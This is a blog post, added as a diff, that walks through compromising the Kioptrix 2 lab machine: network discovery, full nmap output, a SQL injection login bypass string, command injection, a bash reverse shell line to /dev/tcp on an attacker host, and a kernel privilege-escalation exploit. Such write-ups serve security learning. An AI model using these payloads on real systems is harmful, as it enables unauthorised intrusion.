@@ -1,0 +1,303 @@
+<hr />
+
+<p>layout: post
+title: &ldquo;Vulhub kioptrix2&rdquo;
+date: 2016-06-07 15:56:48 -0500
+comments: true</p>
+
+<h2>categories: [vulhub, smb, openssl]</h2>
+
+<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>zap</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.183 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.183 -p-</code></p>
+
+<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-07 16:07 CDT
+</span><span class='line'>NSE: Loaded 138 scripts for scanning.
+</span><span class='line'>NSE: Script Pre-scanning.
+</span><span class='line'>Initiating NSE at 16:07
+</span><span class='line'>Completed NSE at 16:07, 0.00s elapsed
+</span><span class='line'>Initiating NSE at 16:07
+</span><span class='line'>Completed NSE at 16:07, 0.00s elapsed
+</span><span class='line'>Initiating ARP Ping Scan at 16:07
+</span><span class='line'>Scanning 192.168.79.183 [1 port]
+</span><span class='line'>Completed ARP Ping Scan at 16:07, 0.00s elapsed (1 total hosts)
+</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 16:07
+</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 16:08, 13.00s elapsed
+</span><span class='line'>Initiating SYN Stealth Scan at 16:08
+</span><span class='line'>Scanning 192.168.79.183 [65535 ports]
+</span><span class='line'>Discovered open port 443/tcp on 192.168.79.183
+</span><span class='line'>Discovered open port 3306/tcp on 192.168.79.183
+</span><span class='line'>Discovered open port 111/tcp on 192.168.79.183
+</span><span class='line'>Discovered open port 22/tcp on 192.168.79.183
+</span><span class='line'>Discovered open port 80/tcp on 192.168.79.183
+</span><span class='line'>Discovered open port 666/tcp on 192.168.79.183
+</span><span class='line'>Discovered open port 631/tcp on 192.168.79.183
+</span><span class='line'>Completed SYN Stealth Scan at 16:08, 3.99s elapsed (65535 total ports)
+</span><span class='line'>Initiating Service scan at 16:08
+</span><span class='line'>Scanning 7 services on 192.168.79.183
+</span><span class='line'>Completed Service scan at 16:08, 16.01s elapsed (7 services on 1 host)
+</span><span class='line'>Initiating OS detection (try #1) against 192.168.79.183
+</span><span class='line'>NSE: Script scanning 192.168.79.183.
+</span><span class='line'>Initiating NSE at 16:08
+</span><span class='line'>Completed NSE at 16:08, 2.14s elapsed
+</span><span class='line'>Initiating NSE at 16:08
+</span><span class='line'>Completed NSE at 16:08, 0.00s elapsed
+</span><span class='line'>Nmap scan report for 192.168.79.183
+</span><span class='line'>Host is up (0.00052s latency).
+</span><span class='line'>Not shown: 65528 closed ports
+</span><span class='line'>PORT     STATE SERVICE  VERSION
+</span><span class='line'>22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+</span><span class='line'>| ssh-hostkey: 
+</span><span class='line'>|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
+</span><span class='line'>|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
+</span><span class='line'>|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
+</span><span class='line'>|_sshv1: Server supports SSHv1
+</span><span class='line'>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+</span><span class='line'>| http-methods: 
+</span><span class='line'>|_  Supported Methods: GET HEAD POST OPTIONS
+</span><span class='line'>|_http-server-header: Apache/2.0.52 (CentOS)
+</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+</span><span class='line'>111/tcp  open  rpcbind  2 (RPC #100000)
+</span><span class='line'>| rpcinfo: 
+</span><span class='line'>|   program version   port/proto  service
+</span><span class='line'>|   100000  2            111/tcp  rpcbind
+</span><span class='line'>|   100000  2            111/udp  rpcbind
+</span><span class='line'>|   100024  1            663/udp  status
+</span><span class='line'>|_  100024  1            666/tcp  status
+</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+</span><span class='line'>| http-methods: 
+</span><span class='line'>|_  Supported Methods: GET HEAD POST OPTIONS
+</span><span class='line'>|_http-server-header: Apache/2.0.52 (CentOS)
+</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+</span><span class='line'>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+</span><span class='line'>| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+</span><span class='line'>| Public Key type: rsa
+</span><span class='line'>| Public Key bits: 1024
+</span><span class='line'>| Signature Algorithm: md5WithRSAEncryption
+</span><span class='line'>| Not valid before: 2009-10-08T00:10:47
+</span><span class='line'>| Not valid after:  2010-10-08T00:10:47
+</span><span class='line'>| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
+</span><span class='line'>|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
+</span><span class='line'>|_ssl-date: 2016-06-07T17:59:07+00:00; -3h09m26s from scanner time.
+</span><span class='line'>| sslv2: 
+</span><span class='line'>|   SSLv2 supported
+</span><span class='line'>|   ciphers: 
+</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+</span><span class='line'>|     SSL2_RC2_128_CBC_WITH_MD5
+</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
+</span><span class='line'>|     SSL2_RC4_64_WITH_MD5
+</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
+</span><span class='line'>|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+</span><span class='line'>631/tcp  open  ipp      CUPS 1.1
+</span><span class='line'>| http-methods: 
+</span><span class='line'>|   Supported Methods: GET HEAD OPTIONS POST PUT
+</span><span class='line'>|_  Potentially risky methods: PUT
+</span><span class='line'>|_http-server-header: CUPS/1.1
+</span><span class='line'>|_http-title: 403 Forbidden
+</span><span class='line'>666/tcp  open  status   1 (RPC #100024)
+</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
+</span><span class='line'>MAC Address: 00:0C:29:55:D2:EE (VMware)
+</span><span class='line'>Device type: general purpose
+</span><span class='line'>Running: Linux 2.6.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
+</span><span class='line'>OS details: Linux 2.6.9 - 2.6.30
+</span><span class='line'>Uptime guess: 0.018 days (since Tue Jun  7 15:42:38 2016)
+</span><span class='line'>Network Distance: 1 hop
+</span><span class='line'>TCP Sequence Prediction: Difficulty=201 (Good luck!)
+</span><span class='line'>IP ID Sequence Generation: All zeros
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'>1   0.52 ms 192.168.79.183
+</span><span class='line'>
+</span><span class='line'>NSE: Script Post-scanning.
+</span><span class='line'>Initiating NSE at 16:08
+</span><span class='line'>Completed NSE at 16:08, 0.00s elapsed
+</span><span class='line'>Initiating NSE at 16:08
+</span><span class='line'>Completed NSE at 16:08, 0.00s elapsed
+</span><span class='line'>Read data files from: /usr/bin/../share/nmap
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 37.28 seconds
+</span><span class='line'>           Raw packets sent: 65555 (2.885MB) | Rcvd: 65551 (2.623MB)
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Use Nikto to scan  the web service.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>not so excited.</p>
+
+<p>check the webpage:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>may contain SQL injection. Use zap to scan:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Finally try username as <code>test</code>, password <code>test' or '1'=1'</code> can bypass the login.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now I am looking for command injection:</p>
+
+<p>try:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Okay. Now set up netcat on port 4444 and in the web console:</p>
+
+<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>But not the root. Keep going&hellip;</p>
+
+<p>After enumeration, I found the kernel version is 2.6.9. Now search the exploit</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Find an interestig one. I tried other exploits too, but failed..</p>
+
+<p>Upload it to the target, compile and run it. ROOT:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
